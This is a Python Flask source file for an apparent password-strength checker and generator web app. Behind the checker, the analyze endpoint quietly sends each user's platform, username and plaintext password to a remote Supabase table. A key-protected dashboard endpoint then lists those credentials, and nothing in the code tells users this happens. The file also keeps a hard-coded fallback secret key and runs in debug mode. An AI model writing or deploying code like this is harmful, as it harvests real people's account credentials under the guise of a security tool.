from flask import Flask, render_template, request, jsonify, send_file, session
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_wtf.csrf import CSRFProtect
import os
import datetime
import requests
from utils.analyzer import analyze_password
from utils.generator import generate_password as gen_pass
from utils.report_builder import generate_txt_report, generate_csv_report, generate_json_report
from io import BytesIO

app = Flask(__name__)

app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev-fallback-key-change-this')
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['WTF_CSRF_TIME_LIMIT'] = None

csrf = CSRFProtect(app)
limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="memory://"
)

SUPABASE_URL = os.environ.get('SUPABASE_URL')
SUPABASE_KEY = os.environ.get('SUPABASE_KEY')
DASHBOARD_KEY = os.environ.get('DASHBOARD_KEY')


def supabase_insert(table, data):
    if not SUPABASE_URL or not SUPABASE_KEY:
        print("Supabase credentials not configured")
        return False
    try:
        url = f"{SUPABASE_URL}/rest/v1/{table}"
        headers = {
            "apikey": SUPABASE_KEY,
            "Authorization": f"Bearer {SUPABASE_KEY}",
            "Content-Type": "application/json",
            "Prefer": "return=minimal"
        }
        response = requests.post(url, headers=headers, json=data, timeout=5)
        if response.status_code in (200, 201):
            return True
        else:
            print(f"Supabase insert failed: {response.status_code} {response.text}")
            return False
    except Exception as e:
        print(f"Supabase error: {e}")
        return False


def supabase_select(table, order=None, limit=None):
    if not SUPABASE_URL or not SUPABASE_KEY:
        return []
    try:
        url = f"{SUPABASE_URL}/rest/v1/{table}"
        headers = {
            "apikey": SUPABASE_KEY,
            "Authorization": f"Bearer {SUPABASE_KEY}",
            "Content-Type": "application/json"
        }
        params = {"select": "*"}
        if order:
            params["order"] = order
        if limit:
            params["limit"] = limit
        response = requests.get(url, headers=headers, params=params, timeout=5)
        if response.status_code == 200:
            return response.json()
        else:
            print(f"Supabase select failed: {response.status_code} {response.text}")
            return []
    except Exception as e:
        print(f"Supabase error: {e}")
        return []


@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/admin/dashboard-secret-xyz')
def admin():
    return render_template('admin.html')


@app.route('/api/analyze', methods=['POST'])
@limiter.limit("10 per minute")
def analyze():
    data = request.json
    platform = data.get('platform', 'Other')
    username = data.get('username', '')
    password = data.get('password', '')

    if not password:
        return jsonify({"error": "Password is required"}), 400

    analysis = analyze_password(password, username)

    log_data = {
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "platform": platform,
        "username": username,
        "password": password,
        "length": analysis['length'],
        "score": analysis['score'],
        "entropy": analysis['entropy'],
        "rating": analysis['rating'],
        "crack_time": analysis['crack_times']['gpu'],
        "recommendations": ", ".join(analysis['recommendations']) if analysis['recommendations'] else ""
    }

    supabase_insert("logs", log_data)

    session['last_analysis'] = analysis
    session['last_log_data'] = log_data

    return jsonify(analysis)


@app.route('/api/generate', methods=['POST'])
@limiter.limit("20 per minute")
def generate():
    data = request.json
    strength = data.get('strength', 'strong')
    length = data.get('length', 16)
    pwd = gen_pass(strength, length)
    return jsonify({"password": pwd})


@app.route('/api/report/<format>', methods=['GET'])
@limiter.limit("10 per minute")
def report(format):
    if 'last_log_data' not in session or 'last_analysis' not in session:
        return jsonify({"error": "No recent analysis found"}), 404

    log_data = session['last_log_data']
    analysis = session['last_analysis']

    full_data = {**log_data, "crack_times": analysis['crack_times']}

    if format == 'txt':
        content = generate_txt_report(full_data)
        mimetype = 'text/plain'
        filename = f"report_{log_data['timestamp'].replace(':', '-')}.txt"
    elif format == 'csv':
        content = generate_csv_report(full_data)
        mimetype = 'text/csv'
        filename = f"report_{log_data['timestamp'].replace(':', '-')}.csv"
    elif format == 'json':
        content = generate_json_report(full_data)
        mimetype = 'application/json'
        filename = f"report_{log_data['timestamp'].replace(':', '-')}.json"
    else:
        return jsonify({"error": "Invalid format"}), 400

    buffer = BytesIO()
    buffer.write(content.encode('utf-8'))
    buffer.seek(0)

    return send_file(
        buffer,
        as_attachment=True,
        download_name=filename,
        mimetype=mimetype
    )


@app.route('/api/dashboard', methods=['GET'])
def dashboard():
    provided_key = request.headers.get('X-Dashboard-Key')
    if not DASHBOARD_KEY or provided_key != DASHBOARD_KEY:
        return jsonify({"error": "Unauthorized"}), 403

    total = 0
    total_score = 0
    weak_count = 0
    strong_count = 0
    platforms = {}
    recent = []

    rows = supabase_select("logs", order="id.desc")
    total = len(rows)

    for row in rows[:5]:
        recent.append(
            f"Date: {row.get('timestamp')} | Platform: {row.get('platform')} | "
            f"Username: {row.get('username')} | Password: {row.get('password')} | "
            f"Length: {row.get('length')} | Score: {row.get('score')} | "
            f"Entropy: {row.get('entropy')} | Crack Time: {row.get('crack_time')}"
        )

    for row in rows:
        try:
            platform = row.get('platform', 'Other')
            score = int(row.get('score', 0))
            platforms[platform] = platforms.get(platform, 0) + 1
            total_score += score
            if score < 60:
                weak_count += 1
            if score >= 80:
                strong_count += 1
        except:
            pass

    avg_score = round(total_score / total, 1) if total > 0 else 0
    top_platform = max(platforms, key=platforms.get) if platforms else "None"

    return jsonify({
        "total": total,
        "average_score": avg_score,
        "weak_count": weak_count,
        "strong_count": strong_count,
        "most_selected_platform": top_platform,
        "recent": recent,
        "platforms": platforms
    })


if __name__ == '__main__':
    app.run(debug=True, port=5000)